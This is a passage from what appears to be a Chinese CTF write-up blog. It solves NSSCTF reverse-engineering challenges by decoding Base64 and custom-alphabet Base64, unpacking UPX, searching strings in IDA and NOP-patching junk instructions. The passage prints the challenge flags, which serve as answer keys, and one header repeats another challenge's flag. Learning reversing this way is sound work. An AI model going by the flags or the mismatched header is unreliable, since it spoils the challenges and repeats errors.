class="string">''</span>.join(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密并打印flag</span></span><br><span class="line">flag = decrypt_flag()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解密后的flag:"</span>, flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证解密是否正确</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_flag</span>(<span class="params">flag</span>):</span><br><span class="line">    encrypted = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ord</span>(c) &lt;= <span class="built_in">ord</span>(<span class="string">'b'</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(c) &gt;= <span class="built_in">ord</span>(<span class="string">'a'</span>)) <span class="keyword">or</span> \</span><br><span class="line">                (<span class="built_in">ord</span>(c) &lt;= <span class="built_in">ord</span>(<span class="string">'B'</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(c) &gt;= <span class="built_in">ord</span>(<span class="string">'A'</span>)):</span><br><span class="line">            encrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) + <span class="number">24</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            encrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(c) - <span class="number">2</span>)</span><br><span class="line">        encrypted.append(encrypted_char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(encrypted)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"验证加密结果:"</span>, encrypt_flag(flag))  <span class="comment"># 应该输出 "ylqq]aycqyp{"</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p> anss_caesar}</p></blockquote><p>最终flag为:NSSCTF{nss_caesar}</p><hr><h2 id="25-SWPUCTF-2022-新生赛-base64"><a href="#25-SWPUCTF-2022-新生赛-base64" class="headerlink" title="25 [SWPUCTF 2022 新生赛]base64"></a>25 [SWPUCTF 2022 新生赛]base64</h2><p>🚩flag：<code>NSSCTF{base_64_NTWQ4ZGDNC7N}</code></p><p>💡hint：<code>Base64</code> <code>C</code> <code>逆向技术</code></p><p>ida pro分析。</p><p>使用shift+f12.</p><p>![截屏2025-08-10 15.14.19](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 15.14.19.png)</p><p>得到base64字符串：<code>TlNTQ1RGe2Jhc2VfNjRfTlRXUTRaR0ROQzdOfQ==</code></p><p>进行解码，得到flag。</p><hr><h2 id="26-WUSTCTF-2020-level2"><a href="#26-WUSTCTF-2020-level2" class="headerlink" title="26 [WUSTCTF 2020]level2"></a>26 [WUSTCTF 2020]level2</h2><p>🚩flag：<code>NSSCTF{Just_upx_-d}</code></p><p>💡hint：<code>脱壳</code> <code>UPX壳</code> <code>逆向技术</code></p><p>分析头部，是elf文件。</p><p>使用upx进行脱壳。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">upx -d attachment-15.elf</span><br></pre></td></tr></tbody></table></figure><p>然后使用ida pro打开。</p><p>看到flag。</p><p>![截屏2025-08-10 16.20.55](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 16.20.55.png)</p><hr><h2 id="27-HUBUCTF-2022-新生赛-simple-RE"><a href="#27-HUBUCTF-2022-新生赛-simple-RE" class="headerlink" title="27 [HUBUCTF 2022 新生赛]simple_RE"></a>27 [HUBUCTF 2022 新生赛]simple_RE</h2><p>🚩flag：<code>NSSCTF{a8d4347722800e72e34e1aba3fe914ae}</code></p><p>💡hint：<code>Base64</code> <code>C</code> <code>逆向技术</code></p><p>使用ida pro打开，得到一串字符串。</p><p>5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOf</p><p>看着像BASE64，解码一下，没解出来，应该是自定义编码。</p><p>![截屏2025-08-10 16.24.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 16.24.48.png)</p><p>看加密函数</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_401770</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)dword_407030;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_407030 )</span><br><span class="line">  {</span><br><span class="line">    dword_407030 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> sub_401700();</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>还有：</p><p>.rdata:000000000040400000000041CqvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD</p><p>.data:000000000040302000000039C5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==</p><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">"5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8=="</span>   <span class="comment">#str1是要解密的代码</span></span><br><span class="line">string1 = <span class="string">"qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD"</span>   <span class="comment">#string1是改过之后的base64表</span></span><br><span class="line">string2 = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span></span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="28-HDCTF-2023-easy-re"><a href="#28-HDCTF-2023-easy-re" class="headerlink" title="28 [HDCTF 2023]easy_re"></a>28 [HDCTF 2023]easy_re</h2><p>🚩flag：<code>NSSCTF{a8d4347722800e72e34e1aba3fe914ae}</code></p><p>💡hint：<code>Base64</code> <code>UPX</code> <code>脱壳</code></p><p>upx脱壳之后，使用ida pro打开。</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  func(a, encode_a);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your flag:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">    f3(s);</span><br><span class="line">  func(s, encode_s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(encode_s, a) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Congratulations! You get the flag"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Sorry,try again"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">func</span><span class="params">(<span class="type">char</span> *x, <span class="type">char</span> *y)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> __int8 *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 a4[<span class="number">4</span>]; <span class="comment">// [rsp+29h] [rbp-67h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 a3[<span class="number">3</span>]; <span class="comment">// [rsp+2Dh] [rbp-63h]</span></span><br><span class="line">  <span class="type">char</span> b[<span class="number">76</span>]; <span class="comment">// [rsp+30h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+7Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+84h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> len; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line">  <span class="type">char</span> *xa; <span class="comment">// [rsp+A0h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  xa = x;</span><br><span class="line">  index = <span class="number">0</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(x);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  k = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(b, <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( len-- )</span><br><span class="line">  {</span><br><span class="line">    v3 = (<span class="type">unsigned</span> __int8 *)xa++;</span><br><span class="line">    v4 = *v3;</span><br><span class="line">    LODWORD(v3) = i++;</span><br><span class="line">    a3[(<span class="type">int</span>)v3] = v4;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">3</span> )</span><br><span class="line">    {</span><br><span class="line">      a4[<span class="number">0</span>] = a3[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      a4[<span class="number">1</span>] = ((<span class="number">16</span> * a3[<span class="number">0</span>]) &amp; <span class="number">0x30</span>) + (a3[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">      a4[<span class="number">2</span>] = ((<span class="number">4</span> * a3[<span class="number">1</span>]) &amp; <span class="number">0x3C</span>) + (a3[<span class="number">2</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">      a4[<span class="number">3</span>] = a3[<span class="number">2</span>] &amp; <span class="number">0x3F</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">      {</span><br><span class="line">        v5 = a4[i];</span><br><span class="line">        v6 = index++;</span><br><span class="line">        y[v6] = b[v5];</span><br><span class="line">      }</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span> ( j = i; j &lt;= <span class="number">2</span>; ++j )</span><br><span class="line">      a3[j] = <span class="number">0</span>;</span><br><span class="line">    a4[<span class="number">0</span>] = a3[<span class="number">0</span>] &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    a4[<span class="number">1</span>] = ((<span class="number">16</span> * a3[<span class="number">0</span>]) &amp; <span class="number">0x30</span>) + (a3[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    a4[<span class="number">2</span>] = ((<span class="number">4</span> * a3[<span class="number">1</span>]) &amp; <span class="number">0x3C</span>) + (a3[<span class="number">2</span>] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">    a4[<span class="number">3</span>] = a3[<span class="number">2</span>] &amp; <span class="number">0x3F</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; i &gt;= j; ++j )</span><br><span class="line">    {</span><br><span class="line">      v7 = a4[j];</span><br><span class="line">      v8 = index++;</span><br><span class="line">      y[v8] = b[v7];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v9 = i++;</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v10 = index++;</span><br><span class="line">      y[v10] = <span class="number">61</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  y[index] = <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>其他信息：</p><p>加密字符串：<code>SERDVEZ7WTB1X2hAdjJfL1wvXEA1N2VyM2RfN2hlX3IzdjNyczN9</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">尝试从给定的 Base64 "加密字符串" 恢复原始输入 s，</span></span><br><span class="line"><span class="string">前提假设 f3 每轮对每个字节做 (b = b + key[i%k]) 或 (b = b - key[i%k])（mod 256）。</span></span><br><span class="line"><span class="string">执行 32 轮后比较 base64( result ) == a。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">方法：</span></span><br><span class="line"><span class="string">1. 尝试把给定的字符串当作 base64/urlsafe base64 解码，得到 s_after。</span></span><br><span class="line"><span class="string">2. 对各可能的 key 长 k=1..12，使用已知前缀（NSSCTF{, flag{, FLAG{, etc）推导 key_byte mod 8。</span></span><br><span class="line"><span class="string">3. 若 key 的 mod8 部分在周期上自洽，则用该 key_mod8 还原整个明文并判断是否是可打印/包含 flag 模式。</span></span><br><span class="line"><span class="string">4. 同时尝试“加法”与“减法”两种方向。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目提供的“加密字符串”（被认为是 a，即 base64 编码的某个字符串）</span></span><br><span class="line">a_candidates = [</span><br><span class="line">    <span class="string">"SERDVEZ7WTB1X2hAdjJfL1wvXEA1N2VyM2RfN2hlX3IzdjNyczN9"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可能的 flag 前缀列表（按常见 CTF/题目风格）</span></span><br><span class="line">prefixes = [<span class="string">"NSSCTF{"</span>, <span class="string">"flag{"</span>, <span class="string">"FLAG{"</span>, <span class="string">"CTF{"</span>, <span class="string">"SECCON{"</span>, <span class="string">"ctf{"</span>, <span class="string">"HTB{"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 工具函数：尝试多种 base64 解码（标准 / urlsafe / 补齐）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_b64_variants</span>(<span class="params">s</span>):</span><br><span class="line">    out = []</span><br><span class="line">    <span class="comment"># Try as standard base64</span></span><br><span class="line">    cand = s</span><br><span class="line">    <span class="comment"># add paddings up to 3 '='</span></span><br><span class="line">    <span class="keyword">for</span> pad <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        t = cand + (<span class="string">"="</span> * pad)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            b = base64.b64decode(t, validate=<span class="literal">False</span>)</span><br><span class="line">            out.append(b)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># try urlsafe</span></span><br><span class="line">    <span class="keyword">for</span> pad <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        t = s + (<span class="string">"="</span> * pad)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            b = base64.urlsafe_b64decode(t)</span><br><span class="line">            out.append(b)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># try replacing '_'-&gt;'/' and '-'-&gt;'+'</span></span><br><span class="line">    alt = s.replace(<span class="string">"_"</span>, <span class="string">"/"</span>).replace(<span class="string">"-"</span>, <span class="string">"+"</span>)</span><br><span class="line">    <span class="keyword">for</span> pad <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        t = alt + (<span class="string">"="</span> * pad)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            b = base64.b64decode(t, validate=<span class="literal">False</span>)</span><br><span class="line">            out.append(b)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># unique</span></span><br><span class="line">    uniq = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> out:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> uniq:</span><br><span class="line">            uniq.append(x)</span><br><span class="line">    <span class="keyword">return</span> uniq</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断是否是“像 flag”的字符串（高比例可打印并包含大括号等）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">looks_like_flag</span>(<span class="params">bs</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        txt = bs.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="comment"># if cannot decode as utf-8, consider false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    printable = <span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> ch <span class="keyword">in</span> txt <span class="keyword">if</span> ch <span class="keyword">in</span> string.printable)</span><br><span class="line">    ratio = printable / <span class="built_in">max</span>(<span class="number">1</span>, <span class="built_in">len</span>(txt))</span><br><span class="line">    <span class="comment"># require reasonable printability and a brace or prefix</span></span><br><span class="line">    <span class="keyword">if</span> ratio &gt; <span class="number">0.9</span> <span class="keyword">and</span> (<span class="string">"{"</span> <span class="keyword">in</span> txt <span class="keyword">or</span> <span class="string">"NSSCTF"</span> <span class="keyword">in</span> txt <span class="keyword">or</span> <span class="string">"flag"</span> <span class="keyword">in</span> txt.lower()):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 尝试基于 prefix 推导 key_mod8 并还原（方向 = +1 表示 f3 是加法，-1 表示减法）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_key_from_prefix</span>(<span class="params">s_after, prefix, max_k=<span class="number">12</span>, direction=<span class="number">1</span></span>):</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    s_after: bytes after 32 rounds</span></span><br><span class="line"><span class="string">    prefix: known initial bytes of original plaintext (str)</span></span><br><span class="line"><span class="string">    direction: +1 if b_after = b_orig + 32*key  (mod256)</span></span><br><span class="line"><span class="string">               -1 if b_after = b_orig - 32*key  (mod256)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    plen = <span class="built_in">len</span>(prefix)</span><br><span class="line">    prefix_bytes = prefix.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    L = <span class="built_in">len</span>(s_after)</span><br><span class="line">    results = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_k + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># key_mod8 array init with None</span></span><br><span class="line">        key_mod8 = [<span class="literal">None</span>] * k</span><br><span class="line">        ok = <span class="literal">True</span></span><br><span class="line">        <span class="comment"># Try to deduce key_mod8 from known prefix positions</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(plen, L)):</span><br><span class="line">            b_after = s_after[i]</span><br><span class="line">            b_orig = prefix_bytes[i]</span><br><span class="line">            <span class="comment"># we need 32 * key_mod ≡ dir*(b_after - b_orig) (mod 256)</span></span><br><span class="line">            diff = (b_after - b_orig) &amp; <span class="number">0xFF</span></span><br><span class="line">            <span class="keyword">if</span> direction == -<span class="number">1</span>:</span><br><span class="line">                diff = (-diff) &amp; <span class="number">0xFF</span>  <span class="comment"># convert equation to same LHS form</span></span><br><span class="line">            <span class="comment"># diff must be a multiple of 32 for a solution to exist</span></span><br><span class="line">            <span class="keyword">if</span> diff % <span class="number">32</span> != <span class="number">0</span>:</span><br><span class="line">                ok = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            kmod8 = (diff // <span class="number">32</span>) % <span class="number">8</span>  <span class="comment"># key byte modulo 8</span></span><br><span class="line">            idx = i % k</span><br><span class="line">            <span class="keyword">if</span> key_mod8[idx] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                key_mod8[idx] = kmod8</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> key_mod8[idx] != kmod8:</span><br><span class="line">                    ok = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># For any key positions still None, we can't deduce from prefix; try all 8 possibilities but prune later.</span></span><br><span class="line">        <span class="comment"># Build list of possible assignments for key slots: if known -&gt; single value else -&gt; all 0..7</span></span><br><span class="line">        choices = []</span><br><span class="line">        <span class="keyword">for</span> km <span class="keyword">in</span> key_mod8:</span><br><span class="line">            <span class="keyword">if</span> km <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                choices.append(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">8</span>)))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                choices.append([km])</span><br><span class="line">        <span class="comment"># Now iterate all combinations (8^(num_none)) but typically small because k small</span></span><br><span class="line">        <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(*choices):</span><br><span class="line">            key_mod8_full = <span class="built_in">list</span>(combo)</span><br><span class="line">            <span class="comment"># reconstruct original candidate:</span></span><br><span class="line">            orig = <span class="built_in">bytearray</span>(L)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">                km = key_mod8_full[i % k]</span><br><span class="line">                delta = (<span class="number">32</span> * km) &amp; <span class="number">0xFF</span></span><br><span class="line">                <span class="keyword">if</span> direction == <span class="number">1</span>:</span><br><span class="line">                    <span class="comment"># b_after = b_orig + delta  -&gt; b_orig = b_after - delta</span></span><br><span class="line">                    orig[i] = (s_after[i] - delta) &amp; <span class="number">0xFF</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># b_after = b_orig - delta -&gt; b_orig = b_after + delta</span></span><br><span class="line">                    orig[i] = (s_after[i] + delta) &amp; <span class="number">0xFF</span></span><br><span class="line">            <span class="comment"># check printable / contains prefix</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                txt = orig.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> txt.startswith(prefix) <span class="keyword">and</span> looks_like_flag(orig):</span><br><span class="line">                results.append((k, key_mod8_full, txt))</span><br><span class="line">            <span class="comment"># also accept candidates that contain braces and are printable</span></span><br><span class="line">            <span class="keyword">if</span> looks_like_flag(orig):</span><br><span class="line">                results.append((k, key_mod8_full, txt))</span><br><span class="line">        <span class="comment"># if found some results for this k, record them (no need to try larger combos for same k)</span></span><br><span class="line">        <span class="keyword">if</span> results:</span><br><span class="line">            <span class="comment"># we still continue to collect possibly more results for other k</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> a_candidates:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"=== trying candidate a:"</span>, a)</span><br><span class="line">        decs = try_b64_variants(a)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> decs:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"  [!] no base64 decode succeeded for this candidate."</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> s_after <span class="keyword">in</span> decs:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">"  -&gt; got decoded bytes (len={}): {}"</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(s_after), <span class="built_in">repr</span>(s_after[:<span class="number">60</span>])))</span><br><span class="line">            <span class="comment"># try both directions (add / subtract)</span></span><br><span class="line">            all_results = []</span><br><span class="line">            <span class="keyword">for</span> direction <span class="keyword">in</span> (<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                dirname = <span class="string">"add"</span> <span class="keyword">if</span> direction == <span class="number">1</span> <span class="keyword">else</span> <span class="string">"sub"</span></span><br><span class="line">                <span class="keyword">for</span> pref <span class="keyword">in</span> prefixes:</span><br><span class="line">                    res = try_key_from_prefix(s_after, pref, max_k=<span class="number">10</span>, direction=direction)</span><br><span class="line">                    <span class="keyword">if</span> res:</span><br><span class="line">                        <span class="keyword">for</span> item <span class="keyword">in</span> res:</span><br><span class="line">                            k, key_mod8, txt = item</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">"  [FOUND] direction={}, prefix={}, k={}, key_mod8={}, candidate:"</span>.<span class="built_in">format</span>(dirname, pref, k, key_mod8))</span><br><span class="line">                            <span class="built_in">print</span>(<span class="string">"    "</span>, txt)</span><br><span class="line">                            all_results.append((dirname, pref, k, key_mod8, txt))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> all_results:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"   No candidate found with prefix heuristics. You may try larger key length or different prefix."</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"  Total candidates found:"</span>, <span class="built_in">len</span>(all_results))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Done."</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>其实直接base64解了就好，这里想多了还去写脚本。</p><p>HDCTF{Y0u_h@v2_//@57er3d_7he_r3v3rs3}</p><p>改成</p><p>NSSCTF{Y0u_h@v2_//@57er3d_7he_r3v3rs3}</p><hr><h2 id="29-HNCTF-2022-Week1-超级签到"><a href="#29-HNCTF-2022-Week1-超级签到" class="headerlink" title="29 [HNCTF 2022 Week1]超级签到"></a>29 [HNCTF 2022 Week1]超级签到</h2><p>🚩flag：<code>NSSCTF{hell0_w0rld}</code></p><p>💡hint：<code>C</code> <code>逆向技术</code> <code>语言逆向</code></p><p>直接打开IDA的strings表,查看其中的字符串<code>"wrong flag"</code>,然后右键<code>List cross reference to </code>找到引用该字符串的地方,肯定就是判断Flag的地方了. 后面就按照正常流程分析就可以了</p><p>![截屏2025-08-10 16.48.25](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 16.48.25.png)</p><p><code>hello_world</code>不对，看到admin的帖子说，把o都换成0，就能过了。</p><hr><h2 id="30-SWPUCTF-2022-新生赛-easyre"><a href="#30-SWPUCTF-2022-新生赛-easyre" class="headerlink" title="30 [SWPUCTF 2022 新生赛]easyre"></a>30 [SWPUCTF 2022 新生赛]easyre</h2><p>🚩flag：<code>NSSCTF{oh_you_find_it}</code></p><p>💡hint：<code>C</code> <code>逆向技术</code> <code>语言逆向</code></p><p>一图到底。</p><p>![截屏2025-08-10 16.54.08](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-10 16.54.08.png)</p><hr><h2 id="31-GFCTF-2021-wordy"><a href="#31-GFCTF-2021-wordy" class="headerlink" title="31 [GFCTF 2021]wordy"></a>31 [GFCTF 2021]wordy</h2><p>🚩flag：<code>NSSCTF{u_are2wordy}</code></p><p>💡hint：<code>花指令</code> <code>C</code> <code>逆向技术</code></p><ol><li>定位main函数</li></ol><ul><li>方法1：通过<code>_libc_start_main</code>函数调用链定位</li><li>方法2：IDA文本搜索”main”（Ctrl+T跳转下一个匹配项）</li><li>方法3：观察IDA导航栏棕红色异常代码段</li></ul><ol start="2"><li>识别花指令特征</li></ol><ul><li>异常跳转指令（红色标记的jmp）</li><li>跳转目标地址为<code>loc_xxxx+1</code>形式</li><li>后续字节码无法正常反汇编</li><li>典型模式：<code>0xEB 0xFF 0xC0</code>（jmp short 0xFFC0）</li></ul><ol start="3"><li>手动修复方法</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># 单字节修补示例</span><br><span class="line">Edit -&gt; Patch program -&gt; Assemble</span><br><span class="line">将 EB FF 改为 90 90（NOP指令）</span><br></pre></td></tr></tbody></table></figure><ol 